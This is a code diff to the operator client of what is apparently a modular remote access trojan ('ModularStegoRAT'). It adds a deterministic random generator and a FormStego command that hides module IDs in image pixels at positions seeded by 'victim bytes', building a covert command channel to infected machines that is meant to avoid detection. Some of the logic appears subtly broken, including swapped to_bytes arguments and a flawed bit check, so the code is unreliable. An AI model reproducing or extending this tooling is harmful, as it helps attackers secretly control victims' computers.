@@ -1,7 +1,10 @@
 import os
 import json
+import hmac
 import base64
 import socket
+import hashlib
+from PIL import Image
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.asymmetric import ec
@@ -16,6 +19,35 @@ KEYFILE_PATH = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Python
 DB_INIT_SIZE_BYTES = 1024
 DB_SHOP_SIZE_BYTES_CLIENT = 1024
 DB_SHOP_SIZE_BYTES_SERVER = 8192
+NO_BYTES_PER_MODULE = 2
+
+class HMAC_DRBG:
+    def __init__(self, seed: bytes):
+        self.K = b"\x00" * 32
+        self.V = b"\x01" * 32
+        self._update(seed)
+
+    def _hmac(self, key, data):
+        return hmac.new(key, data, hashlib.sha256).digest()
+
+    def _update(self, seed=b""):
+        self.K = self._hmac(self.K, self.V + b"\x00" + seed)
+        self.V = self._hmac(self.K, self.V)
+        if seed:
+            self.K = self._hmac(self.K, self.V + b"\x01" + seed)
+            self.V = self._hmac(self.K, self.V)
+
+    def randbytes(self, n):
+        output = b""
+        while len(output) < n:
+            self.V = self._hmac(self.K, self.V)
+            output += self.V
+        self._update()
+        return output[:n]
+
+    def randint(self, maxExclusive):
+        raw = self.randbytes(4)
+        return int.from_bytes(raw, "big") % maxExclusive
 
 def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
     oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
@@ -242,7 +274,7 @@ Name: {entry["Module Name"]}
 Owner : {entry["Module Owner Username"]}
 Version : {entry["Module Version"]}
 Last Edited: {ReformatTimestamp(entry["Module Last Edited"])}
-Dependencies : {entry["Dependencies"] if (entry["Dependencies"] != '""') else "None"}
+Dependencies : {entry["Dependencies"] if (entry["Dependencies"] not in ['""', '"_"', '"-"']) else "None"}
 
 Description:
 {entry["Module Description"]} 
@@ -334,6 +366,73 @@ def UpdateModule(moduleName : str, DLLPath : str, description : str, username : 
     dbSocket.shutdown(socket.SHUT_RDWR)
     dbSocket.close()
 
+def FormStego(modules : list[str], coverPath : str, outPath : str, victimBytesHex : str):
+    cover = Image.open(coverPath).convert("RGB")
+    modulesBinaryForm = []
+    for module in modules:
+        moduleBytes = int.to_bytes(NO_BYTES_PER_MODULE, int(module), byteorder="big", signed=False)
+        moduleBytesStrForm = "".join(f'{bit:08b}' for bit in moduleBytes)
+        for bitStr in moduleBytesStrForm:
+            modulesBinaryForm.append(bitStr)
+    
+    #Adding the transmission end marker
+    endTransmissionMarker = ["0", "0", "0", "0", "0", "0", "0", "0"] #This is blocked on the database
+    for bit in endTransmissionMarker:
+        modulesBinaryForm.append(bit)
+    
+    stego = cover.copy()
+    sizeX, sizeY = stego.size
+    
+    stegoBytesHex = os.urandom(16)
+    stegoBytesHexStrForm = "".join(f'{bit:08b}' for bit in stegoBytesHex)
+    
+    availablePixels = [(i,j) for i in range(sizeX) for j in range(sizeY)]
+    
+    for i in range(128):
+        coverPixel = cover.getpixel((i, 0))
+        if(coverPixel[0] == int(stegoBytesHexStrForm[i])):
+            stegoPixel = coverPixel
+        else:
+            coverPixelRChannelQuotient = coverPixel[0] - (coverPixel[0] % 2)
+            if(stegoBytesHexStrForm[i] == "0"):
+                stegoPixel = (coverPixelRChannelQuotient, coverPixel[1], coverPixel[2])
+            else:
+                stegoPixel = (coverPixelRChannelQuotient + 1, coverPixel[1], coverPixel[2])
+    
+        stego.putpixel((i, 0), stegoPixel)
+        availablePixels.remove((i,0))
+    
+    fullDRBGSeed = bytes.fromhex(victimBytesHex) + stegoBytesHex
+    drbg = HMAC_DRBG(fullDRBGSeed)
+    
+    for bitStr in modulesBinaryForm:
+        pixelPosition = availablePixels[drbg.randint(len(availablePixels))]
+        availablePixels.remove(pixelPosition)  
+        channel = drbg.randint(3)
+        
+        coverPixel = cover.getpixel(pixelPosition)
+        if(coverPixel[channel] == int(bitStr)):
+            stegoPixel = coverPixel
+        else:
+            coverPixelChannelQuotient = coverPixel[channel] - (coverPixel[channel] % 2)
+            
+            if(bitStr == "0"):
+                embed = coverPixelChannelQuotient
+            else:
+                embed = coverPixelChannelQuotient + 1
+
+            if(channel == 0):
+                stegoPixel = (embed, coverPixel[1], coverPixel[2])
+            elif(channel == 1):
+                stegoPixel = (coverPixel[0], embed, coverPixel[2])
+            else:
+                stegoPixel = (coverPixel[0], coverPixel[1], embed)
+
+        stego.putpixel(pixelPosition, stegoPixel)
+    
+    stego.save(outPath)
+    print("Stego Saved")
+        
 def ShowHelpDisplay():
     print(
 """
@@ -348,6 +447,7 @@ List of all commands:
 .browseShopSetPage [page number] - Goes to a set page number of the shop
 .moduleQuery [query type - ID, Name or Description] [query] - Queries about modules
 .closeShop - Closes the shop connection
+.formStego [modules] [cover path] [stego path] [victim bytes hex] - Forms a stego with the relevant modules (more modules => more likelly to be detected)
 .quit - Quits the system
 .help - Brings up all available commands
 """)
@@ -415,6 +515,14 @@ while running:
     elif(userInput[0] == ".closeShop" and shopping):
         CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
         shopping = False
+    
+    elif(userInput[0] == ".formStego"):
+        FormStego(
+            userInput[1].strip('"').split(","),
+            userInput[2],
+            userInput[3],
+            userInput[4]
+        )
     
     elif(userInput[0] == ".quit"):
         running = False
